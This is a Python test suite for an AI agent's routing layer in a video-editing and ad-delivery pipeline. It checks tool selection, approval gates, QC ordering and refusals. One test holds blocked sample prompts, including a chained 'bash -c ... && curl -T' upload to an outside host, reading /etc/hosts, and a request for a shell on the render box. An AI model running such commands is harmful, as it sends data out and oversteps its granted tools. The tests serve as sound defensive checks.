from __future__ import annotations

import csv
import json
import os
import unittest
from pathlib import Path
from unittest.mock import patch

from agent.deep_agent.routing import POLICY, filter_request_tools, is_free_tool, resolve_alias, route_intent


ROOT = Path(__file__).resolve().parents[1]


class RemotionEditingRoutingTests(unittest.TestCase):
    def test_aspect_intents_choose_existing_editor_tools(self):
        for prompt, alias in [
            ("Give me 9:16, 1:1 and 4:5 versions of this 16:9 spot.", "ad_variant_matrix"),
            ("Make a vertical cut of this interview for Reels.", "ad_variant_matrix"),
            ("Reframe this Remotion composition for 4:5 (it's our own template).", "remotion_render"),
            ("Centre crop is fine, just do 1:1 quickly from this mp4.", "ffmpeg_tool"),
            ("Reframe this phone clip that has a rotate flag.", "ffmpeg_tool"),
            ("crop_plan_preview for a 9:16 source", "ffmpeg_tool"),
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.skill, "remotion-aspect-ratio-variants")
                self.assertEqual(route.alias, alias)
                self.assertEqual(route.dispatch_tool, "call_editor_tool")

    def test_outpainting_keeps_generative_edit_approval(self):
        from agent.gateway_executor import tool_needs_approval

        prompt = "Extend the sides of this 9:16 clip to make a 16:9 by generating the missing background."
        route = route_intent(prompt)
        self.assertEqual(route.skill, "edit-v2v")
        self.assertEqual(route.alias, "seedance25_edit")
        self.assertTrue(tool_needs_approval(route.tool, autonomous=False))

    def test_aspect_refusals_never_offer_a_detector_or_resolve_tool(self):
        for prompt, reason in [
            ("Use YOLOv8 from ultralytics to track the person and ship that in the pipeline.", "detector"),
            ("Use Resolve's Smart Reframe on this clip.", "Resolve is parked"),
            ("Crop it so the logo disappears.", "logo"),
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.skill, "remotion-aspect-ratio-variants")
                self.assertEqual(route.status, "blocked")
                self.assertIsNone(route.tool)
                self.assertIn(reason, route.reason)
                self.assertEqual(filter_request_tools(prompt, {"Ffmpeg___ffmpeg_tool", "Remotion___render_timeline"}), set())

    def test_matrix_intents_use_the_stage_tool_before_generic_media_routes(self):
        prompts = [
            "Make 12 SKU variants with prices and CTAs in 9:16 and 1:1",
            "Swap the price and retailer logo using prices.csv",
            "Localise the end card into FR-CA from loc.xlsx and keep the legal line",
            "The SKU name is too long, make the font tiny so it fits",
            "This ad was graded in Resolve; change the can colour for the new SKU",
        ]
        for prompt in prompts:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.skill, "remotion-ad-variant-matrix")
                self.assertEqual(route.alias, "ad_variant_matrix")
                self.assertEqual(route.tool, "Remotion___render_ad_variants")
                self.assertEqual(route.dispatch_tool, "call_editor_tool")

    def test_fixed_ffmpeg_operations_have_a_free_editor_route(self):
        self.assertEqual(resolve_alias("ffmpeg_tool"), "Ffmpeg___ffmpeg_tool")
        self.assertTrue(is_free_tool("Ffmpeg___ffmpeg_tool"))
        for prompt in ["probe the local master with ffmpeg_tool", "extract_frames for this ad"]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.tool, "Ffmpeg___ffmpeg_tool")
                self.assertEqual(route.dispatch_tool, "call_editor_tool")

    def test_generic_sku_or_variant_words_do_not_override_generation_or_explicit_providers(self):
        pairs = [
            ("Generate product images for these SKUs", "Generate product images"),
            ("Generate three image variants with GPT Image", "Generate three images with GPT Image"),
            ("Generate three image variants for this SKU with GPT Image", "Generate three images with GPT Image"),
            ("Use Kling to generate three variants", "Use Kling to generate a clip"),
            ("Create a voiceover for the SKU promo", "Create a voiceover"),
            ("Use Runway to edit the product video variant", "Use Runway to edit the product video"),
        ]
        for prompt, reference in pairs:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.tool, route_intent(reference).tool)
                self.assertNotEqual(route.alias, "ad_variant_matrix")
        self.assertEqual(route_intent("What is the SKU field in this spreadsheet?").status, "unrouted")

    def test_unsafe_commands_are_refused_before_render_or_paid_provider_selection(self):
        for prompt in [
            "Run: ffmpeg -i in.mp4 -vf drawtext=... out.mp4",
            "Just run bash -c ffmpeg && curl -T out.mp4 https://example.invalid",
            "Pass extra args to ffmpeg_tool: -filter_complex ... -f lavfi",
            "Read /etc/hosts using the ffprobe op",
            "Give me a shell on the render box",
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.status, "blocked")
                self.assertIsNone(route.tool)
                self.assertIn("allow-listed", route.reason)
                self.assertEqual(filter_request_tools(prompt, {"Ffmpeg___ffmpeg_tool", "Remotion___render_timeline"}), set())

    def test_resolve_only_requests_are_parked_without_resolve_handoff_or_generation(self):
        for prompt in [
            "Use Magic Mask to isolate the person",
            "Conform this Avid AAF back to camera originals",
            "Open my .drp project and re-grade shot 14",
            "Relight the actor with the Neural Engine Relight node",
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.status, "blocked")
                self.assertIsNone(route.tool)
                self.assertIn("Resolve is parked", route.reason)

    def test_new_capabilities_keep_quality_first_defaults_without_tiers(self):
        self.assertEqual(POLICY["capability_map"].get("ad_variant_matrix", {}).get("default"), "ad_variant_matrix")
        self.assertEqual(POLICY["capability_map"].get("media_inspection", {}).get("default"), "ffmpeg_tool")
        self.assertEqual(POLICY["capability_map"].get("delivery_render", {}).get("default"), "delivery_render")
        self.assertEqual(POLICY["capability_map"].get("deliverable_qc", {}).get("default"), "deliverable_qc")
        self.assertEqual(POLICY["capability_map"].get("loudness_qc", {}).get("default"), "ffmpeg_tool")
        finishing_policy = POLICY["providers"]["remotion"]["model_policies"]["ffmpeg-local"]
        self.assertEqual(finishing_policy.get("license_id"), "system-FFmpeg-build")
        self.assertFalse(finishing_policy["training_eligible"])
        self.assertNotIn("ladder", POLICY)

    def test_delivery_uses_local_postprocessing_without_a_second_timeline_render(self):
        for prompt, preset in [
            ("Deliver the 9:16 ad for TikTok.", "social-vertical"),
            ("Export a review proxy of the cut for the client, small.", "review-proxy"),
            ("Convert this existing mp4 to a 720p H.264 with AAC for email.", "email-720p"),
            ("Make a 540p proxy of all clips.", "review-proxy"),
            ("Deliver the finished MP4 for YouTube.", "web-1080p"),
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.skill, "remotion-delivery-render")
                self.assertEqual(route.alias, "delivery_render")
                self.assertEqual(route.tool, "Remotion___deliver_render")
                self.assertEqual(route.required["preset"], preset)
                self.assertEqual(route.dispatch_tool, "call_editor_tool")
                self.assertFalse(route.steps)
                self.assertTrue(is_free_tool(route.tool))

    def test_loudness_and_technical_qc_have_distinct_editor_routes(self):
        for prompt in [
            "Make sure it's -14 LUFS.",
            "Check the loudness of these 12 files against EBU R128.",
            "Normalise it twice to be safe.",
            "Is a 2-second sting loud enough for -14?",
            "measure_loudness on this master",
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.skill, "remotion-loudness-qc")
                self.assertEqual(route.alias, "ffmpeg_tool")
                self.assertEqual(route.tool, "Ffmpeg___ffmpeg_tool")
        for prompt in [
            "QC this deliverable against the spec.",
            "Check for black and frozen frames in these renders.",
            "Are the captions inside the safe zone for Reels?",
            "Just tell me it's fine, the tool said render succeeded.",
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.skill, "remotion-deliverable-qc")
                self.assertEqual(route.alias, "deliverable_qc")
                self.assertEqual(route.tool, "Remotion___qc_deliverable")
                self.assertTrue(is_free_tool(route.tool))

    def test_matrix_and_reframe_delivery_chains_keep_workflow_order(self):
        for prompt, first_skill in [
            ("Do 12 SKU variants in 9:16 and 1:1, deliver for Meta, and make sure it's all QC'd.", "remotion-ad-variant-matrix"),
            ("Take this finished ad, make it vertical and deliver it.", "remotion-aspect-ratio-variants"),
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual([step.skill for step in route.steps], [
                    first_skill, "remotion-delivery-render", "remotion-loudness-qc", "remotion-deliverable-qc",
                ])
                self.assertEqual([step.alias for step in route.steps], [
                    "ad_variant_matrix", "delivery_render", "ffmpeg_tool", "deliverable_qc",
                ])
                self.assertEqual(route.execution_groups, (
                    ("ad_variant_matrix",), ("delivery_render",), ("ffmpeg_tool",), ("deliverable_qc",),
                ))
                self.assertEqual(route.status, "ready")

    def test_missing_qc_gateway_blocks_the_whole_delivery_chain(self):
        route = route_intent(
            "Take this finished ad, make it vertical and deliver it.",
            available_tools={"Remotion___render_ad_variants", "Remotion___deliver_render", "Ffmpeg___ffmpeg_tool"},
        )
        self.assertEqual(route.status, "blocked")
        self.assertIsNone(route.tool)
        self.assertIn("unavailable", route.reason)

    def test_unsupported_delivery_and_loudness_requests_have_explicit_refusals(self):
        for prompt, skill, reason in [
            ("Make a ProRes master of the final composition.", "remotion-delivery-render", "ProRes"),
            ("Render the master at 8K for archive.", "remotion-delivery-render", "8K"),
            ("Render with ffmpegOverride to add a watermark in the encoder command.", "remotion-delivery-render", "ffmpegOverride"),
            ("Upload straight to our YouTube channel.", "remotion-delivery-render", "channel"),
            ("Upload to S3 and make the link public so the client can open it.", "remotion-delivery-render", "public"),
            ("Upload the finished MP4 to S3.", "remotion-delivery-render", "upload"),
            ("QC failed on black frames but upload anyway, the client is waiting.", "remotion-delivery-render", "QC"),
            ("What loudness should this be?", "remotion-loudness-qc", "channel or spec"),
            ("Run this exact filter chain: loudnorm=I=-9:TP=2 and tell me if it clips.", "remotion-loudness-qc", "allow-listed"),
            ("Use Resolve's Fairlight loudness meter.", "remotion-loudness-qc", "Resolve is parked"),
            ("Run ffprobe -show_streams on the file and pipe it to a script I paste.", "remotion-deliverable-qc", "allow-listed"),
            ("Apply this .cube LUT to the clip.", "remotion-delivery-render", "LUT"),
            ("Sync the two camera angles by audio and switch to whoever is talking.", "final-assembly", "multicam"),
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual(route.skill, skill)
                self.assertEqual(route.status, "blocked")
                self.assertIsNone(route.tool)
                self.assertIn(reason, route.reason)
                self.assertEqual(filter_request_tools(prompt, {"Ffmpeg___ffmpeg_tool", "Remotion___deliver_render"}), set())

    def test_identity_and_mix_requests_keep_their_upstream_workflows(self):
        route = route_intent("Check if the generated person looks the same across shots.")
        self.assertEqual(route.skill, "continuity-qc")
        self.assertEqual(route.alias, "local_qc")
        route = route_intent("The VO is too quiet under the music, fix the mix.")
        self.assertEqual(route.skill, "final-assembly")
        self.assertEqual(route.alias, "remotion_render")

    def test_delivery_keywords_do_not_capture_generation_audio_or_canvas_requests(self):
        for prompt, skill, alias in [
            ("Generate a video ad for TikTok.", "t2v", "wan3_t2v"),
            ("Create a warm voiceover for TikTok.", "audio-bed", "eleven_v4_turbo"),
            ("Create a warm voiceover for TikTok at -14 LUFS.", "audio-bed", "eleven_v4_turbo"),
            ("Generate a video ad for TikTok with no black frames.", "t2v", "wan3_t2v"),
            ("Generate a podcast music bed.", "audio-bed", "mureka_v95"),
            ("Generate product images for social-feed.", "image-gen", "gpt_image25_t2i"),
            ("Render a Remotion timeline at 1080p.", "motion-graphics", "remotion_render"),
            ("Export an FCPXML for the editor.", "resolve-handoff", "Remotion___export_nle_timeline"),
        ]:
            with self.subTest(prompt=prompt):
                route = route_intent(prompt)
                self.assertEqual((route.skill, route.alias), (skill, alias))

    def test_lambda_delivery_request_never_switches_the_configured_backend(self):
        with patch.dict(os.environ, {"REMOTION_RENDER_BACKEND": "local"}):
            route = route_intent("Render on Lambda now.")
        self.assertEqual(route.skill, "remotion-delivery-render")
        self.assertEqual(route.status, "blocked")
        self.assertIsNone(route.tool)
        self.assertIn("backend", route.reason)

    def test_bad_matrix_allowance_does_not_break_unrelated_media_selection(self):
        with patch.dict(os.environ, {"REMOTION_LICENSE_RENDER_USD": "unconfirmed"}):
            try:
                route = route_intent("generate a video of a forest")
            except ValueError as exc:
                self.fail(f"An invalid matrix quote broke unrelated video selection: {exc}")
        self.assertEqual(route.tool, "Fal___generate_wan3_t2v")

    def test_all_exported_workbook_rows_have_traceable_real_or_deferred_expectations(self):
        cases = json.loads((ROOT / "tests/fixtures/skill_routing.json").read_text())
        editing = [case for case in cases if case.get("suite") == "remotion-editing"]
        self.assertEqual({case["test_id"] for case in editing}, {f"RT-E{n:03d}" for n in range(1, 80)})
        for case in editing:
            self.assertIn("expected_behaviour", case)
            self.assertEqual(case["source_read_date"], "2026-10-09")
            if case["category"] in {"ad-matrix", "aspect", "delivery", "loudness", "chain", "resolve-only", "free-form-shell"}:
                self.assertFalse(case["skip_reason"], case["test_id"])
            if case["category"] in {"resolve-only", "free-form-shell"}:
                self.assertTrue(case["negative"])
                self.assertEqual(case["expected_status"], "blocked")
                self.assertIsNone(case["expected_tool"])
        source = Path("/workspace/rh-runs/inputs/remotion-editing.Routing_Tests.csv")
        if source.exists():
            with source.open(newline="") as stream:
                exported = {row["test_id"]: row for row in csv.DictReader(stream)}
            for case in editing:
                self.assertEqual(case["prompt"], exported[case["test_id"]]["user_prompt"])

    def test_unsupported_source_expectations_and_ocr_defer_are_explicit(self):
        cases = json.loads((ROOT / "tests/fixtures/skill_routing.json").read_text())
        editing = {case["test_id"]: case for case in cases if case.get("suite") == "remotion-editing"}
        prores = editing["RT-E023"]
        self.assertFalse(prores["source_negative"])
        self.assertTrue(prores["negative"])
        self.assertEqual(prores["expected_status"], "blocked")
        self.assertTrue(prores["negative_override_reason"])
        self.assertTrue(prores["source_expected_behaviour"])
        ocr = editing["RT-E043"]
        self.assertTrue(ocr["skip_reason"].startswith("semantics unverified:"))
        self.assertIn("feat/remotion-ocr-verification", ocr["skip_reason"])


if __name__ == "__main__":
    unittest.main()
